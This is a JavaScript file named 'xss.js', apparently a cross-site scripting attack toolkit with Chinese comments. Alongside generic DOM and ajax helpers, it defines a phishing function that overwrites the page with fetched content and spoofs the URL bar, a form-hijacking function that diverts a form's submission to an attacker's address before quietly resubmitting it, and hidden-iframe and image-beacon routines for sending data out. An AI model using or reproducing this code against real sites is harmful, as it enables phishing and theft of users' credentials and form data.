;;var xss = function(){
  var x = {
   'name':'xss.js',
    'version':'0.1',
    'author':'jackmasa'
 };
  
  x.x=function(id){return document.getElementById(id)};
 
  //容错取值
  x.e=function(_){try{return eval('('+_+')')}catch(e){return''}};
 
  //浏览器 
  x.i={
   i:!!self.ActiveXObject,
   c:!!self.chrome,
    f:self.mozPaintCount>-1,
   o:!!self.opera,
   s:!self.chrome&&!!self.WebKitPoint
  };
  
  //UA
  x.ua = navigator.userAgent;
 
  //判断是否为苹果手持设备
 x.apple=x.ua.match(/ip(one|ad|od)/i)!=null;
 
  //随机数
 x.rdm=function(){return~~(Math.random()*100000)};

 //url编码(UTF8)
 x.ec=encodeURIComponent;

  x.html=document.getElementsByTagName('html')[0];
  
  /*
   * 销毁一个元素
  */
 x.kill=function(e){
   e.parentElement.removeChild(e);
 };

  /*
   *绑定事件
   */
 x.bind=function(e,name,fn){
   e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent("on"+name,fn);
 };
  
  /*
   * dom准备完毕时执行函数
  */
 x.ready=function(fn){
   if(!x.i.i){
     x.bind(document,'DOMContentLoaded',fn);
   }else{
      var s = setInterval(function(){
       try{
          document.body.doScroll('left');
         clearInterval(s);
         fn();
       }catch(e){}
     },4);
   }
 }

 /*
   * 同源检测
  */
 x.o=function(url){
    var link = x.dom('<a href="'+encodeURI(url)+'">',2);
    return link.protocol+link.hostname+':'+link.port==location.protocol+location.hostname+':'+link.port;
  };
  
  /*
   * html to dom
   */
 x.dom=function(html,gcsec){
   var tmp = document.createElement('span');
   tmp.innerHTML=html;
   var e = tmp.children[0];
    e.style.display='none';
   x.html.appendChild(e);
    gcsec>>0>0&&setTimeout(function(){
     x.kill(e);
    },gcsec*1000);
    return e;
 };

  /*
   * ajax
  */
 x.ajax = function(url,params,callback){
   (params instanceof Function)&&(callback=params,params=void(0));
   var XHR = (!x.o(url)&&window.XDomainRequest)||
          window.XMLHttpRequest||
         (function(){return new ActiveXObject('MSXML2.XMLHTTP')});
   var xhr = new XHR();
    xhr.open(params?'post':'get',url);
    try{xhr.setRequestHeader('content-type','application/x-www-form-urlencoded')}catch(e){}
   callback&&(xhr.onreadystatechange = function() {
      (this.readyState == 4 && ((this.status >= 200 && this.status <= 300) || this.status == 304))&&callback.apply(this,arguments);
   });
   xhr.send(params);
 };

  /*
   * no ajax
   */
 x.najax=function(url,params){
   if(params){
     var form = x.dom('<form method=post accept-charset=utf-8>');
      form.action=url;
      for(var name in params){
        var input = document.createElement('input');
        input.name=name;
        input.value=params[name];
       form.appendChild(input);
      }
     var iframe = x.dom('<iframe name=_'+x.rdm()+'_>',6);
      form.target=iframe.name;
      form.submit();
    }else{
      new Image().src=url+'&'+x.rdm();
    }
 };

  /*
   * 钓鱼
  */
 x.phish=function(url){
    x.ajax(url,function(){
      document.open();
      document.write(this.responseText);
      document.close();
     history.replaceState&x.o(url)&&history.replaceState('','',url);
   })
  };

  /*
   * 表单劫持
  */
 x.xform=function(form,action){
    form.old_action=form.action,form.old_target=form.target,form.action=action;
   var iframe = x.dom('<iframe name=_'+x.rdm()+'_>');
    form.target=iframe.name;
    setTimeout(function(){
      x.bind(iframe,'load',function(){
        form.action=form.old_action,form.target=form.old_target,form.onsubmit=null,form.submit();
     })
    },30);
  };
  
  /*
   * 函数代理
  */
 x.proxy=function(fn,before,after){
    return function(){
      before&&before.apply(this,arguments);
     var result = fn.apply(this,arguments);
      after&&after.apply(this,arguments);
     return result;
    }
 };
  
  return x;
}();
